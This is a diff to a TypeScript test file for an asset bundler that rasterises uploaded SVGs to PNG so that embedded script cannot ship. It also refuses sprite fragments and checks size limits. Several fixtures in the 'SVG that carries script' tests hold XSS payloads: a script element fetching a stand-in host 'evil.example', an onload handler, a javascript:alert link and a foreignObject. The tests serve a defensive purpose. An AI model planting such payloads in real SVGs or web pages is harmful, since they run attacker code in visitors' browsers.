@@ -39,13 +39,26 @@ afterAll(async () => {
   for (const root of scratchRoots) await rm(root, { recursive: true, force: true }).catch(() => undefined);
 });
 
+/** A root element with a size, and a drawing filling it. */
+const OPEN =
+  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" fill="#c33" />';
+const CLOSE = "</svg>";
+
+/**
+ * Two drawings that render to different pixels. An SVG ships as a PNG of what it draws and
+ * is named by those pixels, so two files that draw the same picture land once; a fixture
+ * meant to be a second asset has to look different, not only read differently.
+ */
+const OVERLAY = `${OPEN}${CLOSE}`;
+const OTHER = `${OPEN}<circle cx="5" cy="5" r="4" fill="#36c" />${CLOSE}`;
+
 async function scratch(): Promise<{ sourceDir: string; outDir: string }> {
   const root = await mkdtemp(join(tmpdir(), "taggant-bundle-"));
   scratchRoots.push(root);
   const sourceDir = join(root, "source");
   await mkdir(sourceDir, { recursive: true });
-  await writeFile(join(sourceDir, "overlay.svg"), '<svg xmlns="http://www.w3.org/2000/svg"></svg>');
-  await writeFile(join(sourceDir, "other.svg"), '<svg xmlns="http://www.w3.org/2000/svg"></svg>');
+  await writeFile(join(sourceDir, "overlay.svg"), OVERLAY);
+  await writeFile(join(sourceDir, "other.svg"), OTHER);
   return { sourceDir, outDir: join(root, "out") };
 }
 
@@ -81,7 +94,8 @@ describe("bundle", () => {
       runtimeDir: RUNTIME_DIST,
     });
     expect(result.assets.length).toBe(1);
-    expect(result.assets[0]?.to).toMatch(/^assets\/[0-9a-f]{16}\.svg$/);
+    // Named by the rendered pixels, and a PNG whatever the source was called.
+    expect(result.assets[0]?.to).toMatch(/^assets\/[0-9a-f]{16}\.png$/);
   });
 
   it("rewrites the manifest inside the bundle to point at what was copied", async () => {
@@ -210,8 +224,8 @@ describe("within", () => {
 describe("publishing again", () => {
   it("leaves the folder holding this bundle and nothing else", async () => {
     const { sourceDir, outDir } = await scratch();
-    // Distinct content, or content addressing correctly stores the two as one.
-    await writeFile(join(sourceDir, "other.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><rect /></svg>');
+    // The two fixtures draw different pictures, or content addressing correctly stores
+    // them as one.
     const both = structuredClone(MANIFEST) as typeof MANIFEST;
     both.targets[0]?.content.push({ type: "image", src: "other.svg" });
     await bundle({ manifest: both, targets: { front: TARGET }, sourceDir, outDir, runtimeDir: RUNTIME_DIST });
@@ -260,29 +274,78 @@ describe("publishing again", () => {
 });
 
 describe("an asset referenced by a fragment", () => {
-  it("bundles the file and keeps the fragment on the rewritten path", async () => {
+  it("is refused, because a bundle carries no document a fragment could point into", async () => {
     const { sourceDir, outDir } = await scratch();
     const sprite = structuredClone(MANIFEST) as typeof MANIFEST;
     const content = sprite.targets[0]?.content[0];
-    // How one symbol in an SVG sprite is named. The schema allows it; the bundler treated
-    // the whole string as a filename and could not find it.
+    // How one symbol in an SVG sprite is named. The schema allows it, and a bundle once
+    // carried it onto the rewritten path. An SVG now ships as a PNG, which has no symbols,
+    // so the fragment would name nothing; the author hears that at publish rather than
+    // shipping a path that resolves to nothing on a phone.
     if (content) content.src = "overlay.svg#badge";
-    await bundle({
-      manifest: sprite,
+    await expect(
+      bundle({ manifest: sprite, targets: { front: TARGET }, sourceDir, outDir, runtimeDir: RUNTIME_DIST }),
+    ).rejects.toThrow(/fragment/);
+    // And it was refused before anything was written.
+    await expect(readdir(outDir)).rejects.toThrow();
+  });
+});
+
+describe("an SVG that carries script", () => {
+  const publish = async (svg: string) => {
+    const { sourceDir, outDir } = await scratch();
+    await writeFile(join(sourceDir, "overlay.svg"), svg);
+    const result = await bundle({
+      manifest: MANIFEST,
       targets: { front: TARGET },
       sourceDir,
       outDir,
       runtimeDir: RUNTIME_DIST,
     });
-    const written = JSON.parse(await readFile(join(outDir, "manifest.json"), "utf8"));
-    expect(written.targets[0].content[0].src).toMatch(/^assets\/[0-9a-f]{16}\.svg#badge$/);
-    // And the file the fragment points into is really there, under its name without it.
-    const withoutFragment = written.targets[0].content[0].src.split("#")[0];
-    await expect(readFile(join(outDir, withoutFragment))).resolves.toBeDefined();
+    return { result, outDir };
+  };
+
+  // A bundle is served by any static host, including one that sets no headers, and the
+  // console takes uploads: an operator can be handed an SVG and publish it onto their own
+  // domain without opening it. The runtime loads content through an img element and would
+  // not run any of this; navigating straight to the asset would. So the file is not what
+  // ships. It is rendered, and pixels of a drawing carry nothing that was written round it.
+  // The payloads every review produced go through `nothing-reaches-out.test.ts`; these are
+  // the four shapes the first version of this control was written against.
+  const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+  const active: [string, string][] = [
+    ["a script element", `${OPEN}<script>fetch("//evil.example")</script>${CLOSE}`],
+    ["an event handler", `${OPEN}<rect width="10" height="10" onload="fetch(1)" />${CLOSE}`],
+    [
+      "a javascript: link",
+      `${OPEN}<a href="javascript:alert(1)"><rect width="10" height="10" /></a>${CLOSE}`,
+    ],
+    ["a foreignObject", `${OPEN}<foreignObject><b>x</b></foreignObject>${CLOSE}`],
+  ];
+  for (const [what, svg] of active) {
+    it(`ships ${what} as pixels of the drawing and nothing else`, async () => {
+      const { result, outDir } = await publish(svg);
+      expect(result.assets.map((asset) => asset.to)).toEqual([
+        expect.stringMatching(/^assets\/[0-9a-f]{16}\.png$/),
+      ]);
+      const written = await readFile(join(outDir, result.assets[0]?.to ?? ""));
+      expect(written.subarray(0, 8)).toEqual(PNG);
+      expect(written.toString("latin1")).not.toMatch(/evil\.example|fetch|alert|foreignObject/);
+      expect(await readdir(join(outDir, "assets"))).not.toContainEqual(expect.stringMatching(/\.svg$/));
+    });
+  }
+
+  it("publishes an ordinary drawing, including one that says the word script", async () => {
+    // Nothing is refused for a word appearing. The text of the file is never what decides.
+    const { result } = await publish(
+      `${OPEN}<title>A script of the play</title><!-- <script>once, in a comment</script> --><path d="M0 0h10v10H0z" />${CLOSE}`,
+    );
+    expect(result.assets).toHaveLength(1);
+    expect(result.assets[0]?.to).toMatch(/\.png$/);
   });
 });
 
-describe("an SVG that carries script", () => {
+describe("what an SVG declares as its size", () => {
   const publish = async (svg: string) => {
     const { sourceDir, outDir } = await scratch();
     await writeFile(join(sourceDir, "overlay.svg"), svg);
@@ -295,39 +358,28 @@ describe("an SVG that carries script", () => {
     });
   };
 
-  // A bundle is served by any static host, including one that sets no headers, and the
-  // console takes uploads: an operator can be handed an SVG and publish it onto their own
-  // domain without opening it. The runtime loads content through an img element and would
-  // not run any of this; navigating straight to the asset would.
-  const active: [string, string][] = [
-    [
-      "a script element",
-      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil.example")</script></svg>',
-    ],
-    ["an event handler", '<svg xmlns="http://www.w3.org/2000/svg"><rect onload="fetch(1)" /></svg>'],
-    [
-      "a javascript: link",
-      '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect /></a></svg>',
-    ],
-    [
-      "a foreignObject",
-      '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><b>x</b></foreignObject></svg>',
-    ],
-  ];
-  for (const [what, svg] of active) {
-    it(`refuses ${what}`, async () => {
-      await expect(publish(svg)).rejects.toThrow(/carrying/);
-    });
-  }
-
-  it("publishes an ordinary drawing, including one that says the word script", async () => {
-    // The refusal has to be about what a browser would run, not about a word appearing.
+  it("does not decide how large it is rendered", async () => {
+    // A drawing declared across a hundred thousand units, as a poster in tenths of a
+    // millimetre might be, renders at the same size as a label of ten. Read at its declared
+    // size it would exceed the renderer's pixel limit and be refused for being large.
     const result = await publish(
-      '<svg xmlns="http://www.w3.org/2000/svg"><title>A script of the play</title>' +
-        "<!-- <script>once, in a comment</script> -->" +
-        '<path d="M0 0h10v10H0z" /></svg>',
+      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100000 100000"><rect width="100000" height="100000" fill="#c33" /></svg>',
     );
-    expect(result.assets).toHaveLength(1);
+    expect(result.assets[0]?.to).toMatch(/\.png$/);
+  });
+
+  it("is refused past what any renderer holds, and told so", async () => {
+    await expect(
+      publish(
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000000 1000000"><rect width="10" height="10" /></svg>',
+      ),
+    ).rejects.toThrow(/too large/);
+  });
+
+  it("is refused when there is none, and told what would give it one", async () => {
+    // The renderer reports this as a corrupt header. The file is not corrupt: nothing in
+    // it says how big the picture is, and that is what the author is told.
+    await expect(publish('<svg xmlns="http://www.w3.org/2000/svg"></svg>')).rejects.toThrow(/viewBox/);
   });
 });
 
